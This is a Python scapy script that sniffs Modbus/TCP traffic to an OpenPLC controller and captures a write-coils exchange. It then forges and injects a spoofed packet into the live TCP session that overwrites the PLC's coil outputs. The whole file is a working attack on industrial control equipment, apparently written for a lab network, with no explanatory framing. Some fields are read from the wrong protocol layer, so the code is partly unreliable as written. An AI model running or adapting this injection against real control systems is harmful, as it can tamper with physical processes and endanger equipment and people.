from scapy.all import *
victim_ip = "192.168.1.1"

Unit_ID=1
Bit_Count=5
Byte_Count=1
MBFunction=15
Data=0
flag=1
packet_flag=1

class ModbusTCP(Packet):
    name="mbtcp"
    fields_desc=[ ShortField("TransactionIdentifier", 0),
                  ShortField("Protocol Identifier", 0),
                  ShortField("Length", 8),
                  ByteField("Unit Identifier", Unit_ID)
                  ]

class Modbus(Packet):
    name = "modbus"
    fields_desc = [ XByteField("Function Code", MBFunction),
                    ShortField("Reference Number", 0),
                    ShortField("Bit Count", Bit_Count),
                    ByteField("Byte Count", Byte_Count),
                    ByteField("Data", Data)
    ]

OPENPLC_FRAMES = sniff(iface="ens33", count=4, filter="dst net 192.168.1.1")
OPENPLC_WRITE_COILS_QUERY = OPENPLC_FRAMES[2]
OPENPLC_WRITE_COILS_ACK = OPENPLC_FRAMES[3]

try:
    if "x0f\\x00\\x00\\x00\\x05\\x01" in str(OPENPLC_WRITE_COILS_QUERY[Raw].load):
        print("---------------- END OF COMMUNICATION LOOP (WRITE MULTIPLE COILS) DETECTED")
        flag=0
except:
    flag=1

try:
    print(str(bytes_hex(OPENPLC_WRITE_COILS_QUERY[Raw])))
    Transaction_ID = int("0x"+str(bytes_hex(OPENPLC_WRITE_COILS_QUERY[Raw])).replace("b", "").replace("'", "")[0:4], base=16) + 1
except:
    packet_flag=0
    flag=1

if packet_flag == 1:
    print("--------------- CRAFTING PACKET")
    tcpdata = {
        'src': OPENPLC_WRITE_COILS_ACK[IP].src,
        'dst': OPENPLC_WRITE_COILS_ACK[IP].dst,
        'sport': OPENPLC_WRITE_COILS_ACK[TCP].sport,
        'dport': OPENPLC_WRITE_COILS_ACK[TCP].dport,
        'seq': OPENPLC_WRITE_COILS_ACK[IP].seq,
        'ack': OPENPLC_WRITE_COILS_ACK[IP].ack,
        'wnd': OPENPLC_WRITE_COILS_ACK[IP].window
    }

    PAYLOAD = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
                TCP(sport=tcpdata['sport'], dport=tcpdata['dport'],
                flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])

    PAYLOAD = PAYLOAD/ModbusTCP(TransactionIdentifier = Transaction_ID)/Modbus()
    PAYLOAD.show()

    print("------------- INJECTING PACKET")
    send(PAYLOAD, verbose=1, iface="ens33")

    print("------------- PACKET INJECTED")
    PAYLOAD.display()